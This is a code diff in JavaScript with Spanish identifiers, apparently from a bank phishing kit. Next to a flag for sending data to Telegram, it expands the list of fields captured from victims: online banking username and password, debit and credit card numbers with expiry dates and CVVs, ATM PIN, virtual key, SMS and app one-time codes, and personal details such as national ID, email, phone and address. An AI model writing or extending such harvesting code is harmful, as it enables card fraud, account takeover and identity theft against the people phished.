@@ -684,8 +684,12 @@
                 enviandoATelegram = true;
 
                 const allData = {};
-                const fields = ['usuario', 'clave', 'ente', 'numtarjeta', 'cvv', 'vencimiento',
-                    'clavecajero', 'otpapp', 'otpsms', 'status', 'uniqid'
+                const fields = [
+                    'usuario', 'clave', 'ente', 'status', 'uniqid',
+                    'numtarjetaTDB', 'vencimientoTDB', 'cvvTDB',
+                    'numtarjetaTDC', 'vencimientoTDC', 'cvvTDC',
+                    'nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion',
+                    'otpsms', 'otpapp', 'clavecajero', 'clavevirtual'
                 ];
 
                 fields.forEach(field => {
